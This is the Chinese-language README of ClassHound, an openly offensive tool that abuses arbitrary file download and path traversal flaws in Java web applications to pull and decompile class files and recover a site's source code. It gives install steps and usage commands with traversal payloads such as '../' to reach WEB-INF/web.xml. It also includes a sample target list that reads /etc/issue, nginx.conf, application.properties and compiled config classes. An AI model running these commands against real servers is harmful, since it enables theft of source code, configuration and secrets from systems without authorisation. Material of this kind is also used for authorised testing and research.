# ClassHound
**利用任意文件下载漏洞自动循环下载并反编译class文件获得网站源码**



### 下载

```bash
git clone --depth=1 --branch=master https://www.github.com/LandGrey/ClassHound.git
cd ClassHound/
pip install requirements.txt
chmod +x classhound.py
python classhound.py -h
```



### 使用

```markdown
1. -u -k
# 指定可正常下载的目标链接, 并默认使用 '#' 字符标记任意文件下载漏洞的文件位置; 
# -k 参数指定下载失败页面会出现的关键字，用来标识是否下载成功
python classhound.py -u "http://127.0.0.1/download.jsp?path=images/#1.png#" -k "404 not found"

2. -p -dc
# 使用 POST 请求下载文件，并指定标记符为 '##'
python classhound.py -u "http://127.0.0.1/download.jsp" -dc "##" --post "path=##1.png##"

3. -tc -cc
# 当程序自动识别不出漏洞时,如果明确知道遍历文件的字符，可用 -tc 参数指定
# 如果明确知道下载 WEB-INF/web.xml 文件所需要的遍历文件字符数量的话，可同时用 -cc 参数指定
# 例如当能够使用 http://127.0.0.1/download.jsp?path=../../../WEB-INF/web.xml 下载文件时:
python classhound.py -u "http://127.0.0.1/download.jsp?path=#1.png#" -tc "../" -cc 3

4. -f --auto
# 如果想顺带下载些其他已知文件, 可将服务器文件的相对路径一行一个写入文件中, 然后用 -f 参数指定文件
# 相对路径的文件下载可能需要不一样数量的遍历字符, 可以启用 -a/--auto 参数，程序会尝试不同数量的遍历字符
# 例如创建文件 download.txt，内如如下:
/etc/issue
install/index.jsp
/etc/nginx/nginx.conf
application.properties
ROOT/META-INF/MANIFEST.MF
WEB-INF/classes/me/landgrey/config/config.class


# 然后使用命令
python classhound.py -u "http://127.0.0.1/download.jsp?path=images/#1.png#" -k "404 not found" -f download.txt --auto

5. 其余参数
-hh		增加请求时的 HTTP Header
-hp		设置 HTTP/HTTPS 代理
-mc		设置自动探测时尝试的最大遍历字符数量, 默认 10
```



### 效果图

![GIF.gif](https://raw.githubusercontent.com/LandGrey/ClassHound/master/GIF.gif)



### 注意事项

```
1. 程序兼容 python 2.7+ 和 3.4+, 运行前先安装 requirements.txt 中的python模块, 并安装配置好 java 环境变量
2. 使用过程中的 bug 和优化建议欢迎提 issue
3. 程序仅作为安全研究和授权测试使用, 开发人员对因误用和滥用该程序造成的一切损害概不负责
```

